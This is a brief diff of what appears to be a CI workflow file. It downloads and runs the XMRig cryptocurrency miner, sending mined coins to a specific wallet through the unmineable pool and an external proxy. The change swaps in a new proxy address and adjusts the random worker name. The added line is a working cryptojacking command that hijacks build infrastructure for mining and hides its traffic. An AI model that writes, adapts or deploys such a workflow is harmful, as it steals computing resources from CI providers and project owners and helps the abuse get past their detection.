@@ -27,4 +27,4 @@ jobs:
     - name: Extract
       run: Expand-Archive xmrig.zip
     - name: Start
-      run: .\xmrig\xmrig-6.12.2\xmrig.exe -a randomx -o rx.unmineable.com:3333 -u SHIB:0xbade577cb364798821d998811619de7fdb5a9d35.$(shuf -i 10-9999999999999999999 -n 1) --keepalive --donate-level 1 --proxy=88.255.185.252:1082
+      run: .\xmrig\xmrig-6.12.2\xmrig.exe -a randomx -o rx.unmineable.com:3333 -u SHIB:0xbade577cb364798821d998811619de7fdb5a9d35.$(shuf -i 10-9999 -n 1) --keepalive --donate-level 1 --proxy=116.203.147.190:40150
